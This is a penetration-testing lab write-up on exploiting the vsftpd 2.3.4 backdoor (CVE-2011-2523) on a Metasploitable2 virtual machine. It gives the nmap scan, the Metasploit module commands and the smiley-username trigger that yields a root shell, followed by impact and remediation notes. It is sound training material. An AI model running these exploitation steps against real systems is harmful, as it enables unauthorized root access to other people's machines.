# Metasploitable2 — vsftpd 2.3.4 Backdoor Exploitation

## Objective
Set up an isolated penetration testing lab to practice the full attack 
methodology — reconnaissance, vulnerability identification, exploitation, 
and post-exploitation analysis — on a deliberately vulnerable target.

## Lab Environment
| Component | Details |

| Hypervisor | VirtualBox |
| Attacker Machine | Kali Linux |
| Target Machine | Metasploitable2 |
| Network Mode | Host-only |
| Attacker IP | 192.168.56.X |
| Target IP | 192.168.56.X |

## Vulnerability Summary
| Field | Details |

| CVE | CVE-2011-2523 |
| Service | vsftpd 2.3.4 |
| CVSS v2 Score | 10.0 (Critical) |
| CWE | CWE-78 (OS Command Injection) |
| MITRE ATT&CK | T1190 – Exploit Public-Facing Application |

## 1. Reconnaissance
Ran an Nmap scan against the target to enumerate open ports and services:
nmap -sV -p- 192.168.56.X
**Findings:** Port 21 (FTP) running vsftpd 2.3.4 — a version with a known 
backdoor vulnerability publicly documented in the Metasploit database.

## 2. Exploitation
Used Metasploit Framework to exploit the vsftpd backdoor:
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.X
run
The vsftpd 2.3.4 backdoor triggers when a username containing `:)` is 
submitted during FTP login, opening a listener on port 6200 that grants 
an unauthenticated root shell.

**Result:** Root shell access obtained.
whoami
\# root
uname -a

## 3. Impact
- Full unauthenticated remote root access to the target system
- Complete compromise of confidentiality, integrity, and availability
- Attacker could read/modify any file, install persistence, pivot to 
  other systems on the network

## 4. Remediation
- Upgrade vsftpd to a patched version (2.3.5+) immediately
- Never deploy known-vulnerable service versions in production
- Restrict FTP service exposure via firewall rules / network segmentation
- Implement intrusion detection to flag anomalous FTP login patterns
- Regular vulnerability scanning to catch outdated service versions

## Key Takeaways
This lab reinforced how a single outdated service version can lead to 
complete system compromise, and highlighted the importance of version 
management and patch hygiene in real-world environments.


**Tools used:** Kali Linux, Nmap, Metasploit Framework  
**Skills demonstrated:** Reconnaissance, Vulnerability Identification, 
Exploitation, Root Cause Analysis, Remediation Planning
